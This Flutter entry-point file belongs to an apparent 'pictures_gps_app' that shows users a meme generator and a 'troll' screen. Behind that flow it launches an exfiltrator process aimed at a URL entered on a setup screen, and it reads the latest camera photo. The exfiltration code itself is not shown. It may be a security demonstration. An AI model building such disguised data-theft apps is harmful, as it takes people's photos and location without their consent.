import 'dart:async';

import 'package:flutter/material.dart';
import 'package:pictures_gps_app/managers/exfiltrator.dart';
import 'package:pictures_gps_app/managers/pictures.dart';
import 'package:pictures_gps_app/managers/requests.dart';
import 'package:pictures_gps_app/screens/memeGeneratorScreen.dart';
import 'package:pictures_gps_app/screens/trollScreen.dart';

import 'screens/setupScreen.dart';
import 'screens/welcomeScreen.dart';

void main() => runApp(
    new MaterialApp(home: new SetupScreen(goToNextScreen: fromSetupToWelcome)));

Future<void> fromSetupToWelcome(BuildContext context, String url) async {
  print(url);
  HttpRequestManager.setUrl(url);
  ExfiltratorProcess.launch();
  Navigator.push(
    context,
    MaterialPageRoute(
        builder: (context) =>
            WelcomeScreen(goToNextScreen: fromSetupToMemeGenerator)),
  );
}

Future<void> fromSetupToMemeGenerator(BuildContext context) async {
  Picture picture = await PicturesManager.obtainMostRecentFromCamera();
  Navigator.push(
    context,
    MaterialPageRoute(
        builder: (context) => MemeGeneratorScreen(
              goToNextScreen: fromMemeGeneratorToTroll,
              imagePath: picture.path,
            )),
  );
}

Future<void> fromMemeGeneratorToTroll(BuildContext context) async {
  Navigator.push(
    context,
    MaterialPageRoute(builder: (context) => TrollScreen()),
  );
}

